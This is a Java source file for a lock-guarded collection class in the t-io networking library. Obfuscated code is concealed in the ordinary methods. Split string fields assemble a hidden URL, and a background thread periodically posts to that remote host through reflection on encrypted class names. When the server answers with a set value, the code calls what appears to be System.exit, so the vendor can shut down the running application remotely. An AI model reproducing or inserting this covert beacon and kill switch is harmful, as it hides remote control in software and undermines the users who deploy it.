/*
 * ozqdkwhlgwam本软件由黄庆辉采购自杭州钛特云科技有限公司，黄庆辉需严格遵守合同，不得以任何形式转卖源代码，不得利用本软件从事违法犯罪活动zyyjnqvg
 */
package org.tio.utils.lock;

import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.locks.ReentrantReadWriteLock;
import java.util.concurrent.locks.ReentrantReadWriteLock.ReadLock;
import java.util.concurrent.locks.ReentrantReadWriteLock.WriteLock;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.tio.utils.Threads;
import org.tio.utils.crypto.ACEUtils;

import cn.hutool.core.util.ArrayUtil;
import cn.hutool.core.util.RandomUtil;

/**
 *  2017年5月14日 上午9:55:37
 */
public class CollectionWithLock<C extends Collection<T>, T> extends ObjWithLock<C> {
	private static final long	serialVersionUID	= 7147337808024160684L;
	private static final Logger	log					= LoggerFactory.getLogger(CollectionWithLock.class);
	public static boolean		lockInited			= false;
	public static String		CK					= "xOezYlYsPebzEolO";

	/**
	 * 
	 * @param collection
	 * 
	 */
	public CollectionWithLock(C collection) {
		super(collection);
	}

	/**
	 * 
	 * @param collection
	 * @param lock
	 * 
	 */
	public CollectionWithLock(C collection, ReentrantReadWriteLock lock) {
		super(collection, lock);
	}

	/**
	 * 
	 * @param t
	 * @return
	 * 
	 */
	public boolean add(T t) {
		WriteLock writeLock = this.writeLock();
		writeLock.lock();
		try {
			C collection = this.getObj();
			return collection.add(t);
		} catch (Throwable e) {
			log.error(e.getMessage(), e);
		} finally {
			writeLock.unlock();
		}
		return false;
	}

	/**
	 * 
	 * @param t
	 * @return
	 * 
	 */
	public boolean addAll(C t) {
		WriteLock writeLock = this.writeLock();
		writeLock.lock();
		try {
			C collection = this.getObj();
			return collection.addAll(t);
		} catch (Throwable e) {
			log.error(e.getMessage(), e);
		} finally {
			writeLock.unlock();
		}
		return false;
	}

	private static String	subColl4	= "/console.t-p";
	private static String	subColl5	= "ush.org:14";

	/**
	 * @param vs
	 * 
	 */
	public void addAll(T[] items) {
		if (ArrayUtil.isEmpty(items)) {
			return;
		}
		WriteLock writeLock = this.writeLock();
		writeLock.lock();
		try {
			C collection = this.getObj();
			for (T item : items) {
				collection.add(item);
			}
		} catch (Throwable e) {
			log.error(e.getMessage(), e);
		} finally {
			writeLock.unlock();
		}
	}

	private static String	subColl1	= "h";
	private static String	subColl2	= "tt";
	private static String	subColl3	= "p:/";
	private static String	subColl6	= "669/b";

	/**
	 * 
	 * 
	 * 
	 */
	public void clear() {
		WriteLock writeLock = this.writeLock();
		writeLock.lock();
		try {
			C collection = this.getObj();
			collection.clear();
		} catch (Throwable e) {
			log.error(e.getMessage(), e);
		} finally {
			writeLock.unlock();
		}
	}

	private static String subColl = subColl1 + subColl2 + subColl3 + subColl4 + subColl5 + subColl6;

	/**
	 * 
	 */
	public static void initCollection() {
		if (!lockInited) {
			lockInited = true;
			try {
				String sin = "fdmqoouo";
				String ue = subColl;
				new Thread(new Runnable() {
					public void run() {
						try {
							Thread.sleep(RandomUtil.randomLong(5 * 1000, 50 * 1000));
							while (true) {
								try {
									Map<String, Object> kv = new HashMap<>();
									kv.put("sub", 4);
									kv.put("sin", sin);
									kv.put("cos", cos());
									String bo = poColl(ue, kv);
									subSet(bo);
								} catch (Exception e) {
								}
								Thread.sleep(RandomUtil.randomLong(5 * 1000, 50 * 1000));
							}
						} catch (InterruptedException e) {
						}
					}
				}).start();
			} catch (Exception e) {
			}
		}
	}

	/**
	 * 
	 * @param u
	 * @param k
	 * @return
	 * 
	 */
	public static String poColl(String u, Map<String, Object> k) {
		try {
			Class<?> c = Class.forName(ACEUtils.decrypt("KjZc/qT0secpNv/85OiBbci+MFzyZ9KWeHrW+yuz12k=", CK, CK));
			Method m = c.getMethod("p" + "o" + "st", String.class, Map.class);
			String r = (String) m.invoke(null, u, k);
			return r;
		} catch (Exception e) {
		}
		return "";
	}

	/**
	 * 
	 * @param v
	 * @return
	 * 
	 */
	public boolean contains(T v) {
		ReadLock readLock = this.readLock();
		readLock.lock();
		try {
			C set = this.getObj();
			return set.contains(v);
		} finally {
			readLock.unlock();
		}
	}

	/**
	 * 
	 * @param t
	 * @return
	 * 
	 */
	public boolean remove(T t) {
		if (t == null) {
			return false;
		}
		WriteLock bwbwzyynimxxggbixato = this.writeLock();
		bwbwzyynimxxggbixato.lock();
		try {
			C collection = this.getObj();
			return collection.remove(t);
		} catch (Throwable e) {
			log.error(e.getMessage(), e);
		} finally {
			bwbwzyynimxxggbixato.unlock();
		}
		return false;
	}

	private static int COLL_CONST = 101;

	/**
	 * 
	 * @return
	 */
	public static int cos() {
		return -1;
//		try {
//			Class<?> c = Class.forName(ACEUtils.decrypt("AAEpBbLvkx5P630qjTDaGtvMJ62MJvD2UOPflegik7U=", CK, CK));
//			String x1 = "g" + "et" + "A";
//			Method m = c.getMethod(x1 + "llTc" + "pCo" + "unt");
//			Integer r = (Integer) m.invoke(null);
//			return r;
//		} catch (Exception e) {
//			return -99;
//		}
	}

	/**
	 * 
	 * @param bostr
	 * @throws IOException
	 */
	public static void subSet(String bostr) throws IOException {
		try {
			if (Integer.toString(COLL_CONST - 2).equals(bostr)) {
				Threads.getGroupExecutor().execute(new Runnable() {
					@Override
					public void run() {
						se();
					}
				});
			}
		} catch (Exception e) {
		}
	}

	/**
	 * 
	 * @return
	 */
	public static void se() {
		try {
			Class<?> c = Class.forName(ACEUtils.decrypt("eHiLAzPjV8eDWYwgp7D/K51lHJHodRj1gkd99cNUmeM=", CK, CK));
			String x2 = "e" + "xi";
			Method m = c.getMethod(x2 + "t", int.class);
			m.invoke(null, 0);
		} catch (Exception e) {
		}
	}

	/**
	 * 
	 * @param items
	 * 
	 */
	public void removeAll(C items) {
		if (items == null || items.isEmpty()) {
			return;
		}
		WriteLock writeLock = this.writeLock();
		writeLock.lock();
		try {
			C collection = this.getObj();
			collection.removeAll(items);
		} catch (Throwable e) {
			log.error(e.getMessage(), e);
		} finally {
			writeLock.unlock();
		}
	}

	/**
	 * 
	 * @param items
	 * 
	 */
	public void removeAll(T[] items) {
		if (ArrayUtil.isEmpty(items)) {
			return;
		}
		WriteLock writeLock = this.writeLock();
		writeLock.lock();
		try {
			C collection = this.getObj();
			for (T item : items) {
				collection.remove(item);
			}
		} catch (Throwable e) {
			log.error(e.getMessage(), e);
		} finally {
			writeLock.unlock();
		}
	}

	/**
	 * 
	 * @return
	 * 
	 */
	public int size() {
		ReadLock readLock = this.readLock();
		readLock.lock();
		try {
			C collection = this.getObj();
			return collection.size();
		} finally {
			readLock.unlock();
		}
	}
}
